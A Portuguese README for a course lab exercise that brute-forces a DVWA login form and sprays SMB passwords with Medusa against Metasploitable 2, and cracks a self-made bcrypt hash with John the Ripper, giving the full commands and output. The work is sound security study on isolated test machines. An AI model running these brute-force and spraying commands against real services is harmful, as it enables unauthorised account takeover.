# 🔐 Desafio Cybersecurity DIO

## 📖 Descrição do Desafio

Este projeto tem como objetivo **implementar, documentar e compartilhar um ambiente prático de testes de segurança**, utilizando **Kali Linux** e a ferramenta **Medusa**, em conjunto com ambientes propositalmente vulneráveis como **Metasploitable 2** e **DVWA (Damn Vulnerable Web Application)**.

A proposta do desafio é simular **cenários reais de ataque de força bruta**, compreender como eles funcionam na prática e estudar **formas de mitigação e prevenção**.

Durante o desenvolvimento foram realizados testes como:

- Ataques de força bruta em serviços de rede
- Automação de login em formulários web
- Password spraying em serviços SMB
- Testes de quebra de hash utilizando wordlists

⚠️ **Importante:**  
Todos os testes foram realizados **em ambiente controlado e isolado**, com máquinas vulneráveis criadas especificamente para fins educacionais.

---

# 🖥️ Ambiente Utilizado

O laboratório foi montado utilizando **VirtualBox** com duas máquinas virtuais:

| Máquina | Função |
|------|------|
| Kali Linux | Máquina atacante |
| Metasploitable 2 | Máquina vulnerável |

## Configuração de Rede

Foi utilizada a configuração **Host-Only Network**, permitindo comunicação entre as máquinas virtuais sem acesso direto à internet.

Durante a configuração ocorreu um problema onde o **VirtualBox não atribuiu automaticamente um IP Classe C**, mesmo utilizando o modo **Host Only**.

Por esse motivo foi necessário **configurar os endereços IP manualmente** nas máquinas.

Exemplo da rede utilizada:
Kali Linux: 192.168.56.101
Metasploitable 2: 192.168.56.102

---

# 🧰 Ferramentas Utilizadas

- **Kali Linux**
- **Medusa** (ferramenta de brute force)
- **Metasploitable 2**
- **DVWA (Damn Vulnerable Web Application)**
- **John the Ripper**
- **PuTTY**
- **C# (.NET)** para geração de hashes
- **Wordlists personalizadas**

---

# ⚔️ Testes Realizados

## 1️⃣ Ataque de força bruta em formulário web (DVWA)

Foi utilizado o **Medusa** para automatizar tentativas de login em um formulário web da aplicação vulnerável DVWA.

### Wordlists utilizadas

- `users.txt`
- `pass.txt`

### Comando utilizado

```bash
medusa -h 192.168.56.102 -U users.txt -P pass.txt -M http \
-m PAGE:'/dvwa/login.php' \
-m FORM:'username=^USER^&password=^PASS^&Login=Login' \
-m FAIL:'Login failed' \
-t 6
```

# 🗂️ Enumeração e Password Spraying em SMB

Também foram realizados testes contra serviços SMB utilizando password spraying, onde várias contas são testadas com poucas senhas.

### Comando utilizado
```bash
medusa -h 192.168.56.101 -U smb_users.txt -P senhas_spray.txt -M smbnt -t 2 -T 50
```

## 🎯 Objetivo

- Identificar usuários válidos  
- Testar senhas comuns  
- Avaliar vulnerabilidade do serviço SMB  

---

## 🔐 Teste de Cracking de Senha com Hash

Para entender melhor o funcionamento de **hashes de senha** e **quebra de criptografia**, foi desenvolvido um pequeno **programa em C#** para gerar um hash de senha.

A senha utilizada para teste foi:
123456

O hash gerado foi armazenado no arquivo: hash.txt

## 🧪 Quebra de Hash com John the Ripper

Foi utilizado o **John the Ripper** com a famosa wordlist **rockyou.txt**.

### Comando executado

```bash
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

### Resultado:
```bash
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
123456           (?)
1g 0:00:00:00 DONE (2026-03-05 16:43) 3.846g/s 138.4p/s 138.4c/s 138.4C/s 123456..liverpool
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

